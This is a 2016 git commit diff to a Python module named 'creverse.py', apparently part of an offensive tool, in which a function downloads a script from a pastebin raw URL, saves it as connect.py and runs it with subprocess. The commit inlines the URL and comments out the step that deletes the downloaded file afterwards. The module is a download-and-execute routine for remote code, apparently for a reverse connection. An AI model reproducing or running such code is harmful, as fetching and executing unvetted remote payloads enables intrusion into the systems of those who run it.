210b74e0464e88925c018334afd7732304d014b4
ST4LK3RCR4ZY <a_netocosta30@hotmail.com>
2016-12-25 17:02:06 -0300

    Update creverse.py

--- modules/creverse.py
+++ modules/creverse.py
@@ -2,11 +2,10 @@ import os
 import urllib
 import subprocess
 
-filz = "http://pastebin.com/raw/qNjByHqW"
 
 def ran():
         print "[ + ] Connection [ + ]"
 	testfile = urllib.URLopener()
-	testfile.retrieve(filz, "connect.py")
+	testfile.retrieve("http://pastebin.com/raw/qNjByHqW", "connect.py")
 	ls_output=subprocess.Popen(["python", "connect.py"], stdout=subprocess.PIPE)
-	os.remove("connect.py")
+	#os.remove("connect.py")
